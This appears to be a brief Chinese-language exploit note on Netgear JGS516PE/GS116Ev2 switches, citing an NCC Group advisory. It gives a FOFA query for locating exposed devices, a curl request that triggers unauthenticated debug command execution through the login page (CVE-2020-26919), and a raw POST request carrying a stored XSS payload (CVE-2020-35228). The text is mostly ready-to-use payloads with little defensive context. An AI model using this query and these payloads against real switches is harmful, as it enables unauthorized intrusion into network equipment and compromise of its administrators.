# Netgear JGS516PE/GS116Ev2 交换机中多个高危漏洞

FOFA:

```
title="Netgear ProSAFE Plus Switch"
```

**1.未经身份验证的远程代码执行（CVE-2020-26919）**

漏洞点位于login.html中的SubmitId参数，未对调试操作做限制导致用户执行系统命令。

```bash
curl -X POST --data-raw 'submitId=debug&debugCmd=sys+dump&submitEnd='
'http://<IP>/login.htm'
```

**4.存储型XSS（CVE-2020-35228）**


```bash
POST /index.htm HTTP/1.1
Host: 192.168.0.239
User-Agent: (...snip...)
Accept: (...snip...)
Accept-Language: (...snip...)
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://192.168.0.239
Connection: close
Referer: http://192.168.0.239/index.htm?0
Cookie: (...snip...)
Upgrade-Insecure-Requests: 1

submitId=multiLanguageCfg&selectLang=aaaa';alert(1);//&multiLangFlag=0&RegisterStatus=0&registeredPopUp=0&changePwdPopUp=0&changePwd=0&confirmPwd=0&submitEnd=
```

详情：https://research.nccgroup.com/2021/03/08/technical-advisory-multiple-vulnerabilities-in-netgear-prosafe-plus-jgs516pe-gs116ev2-switches/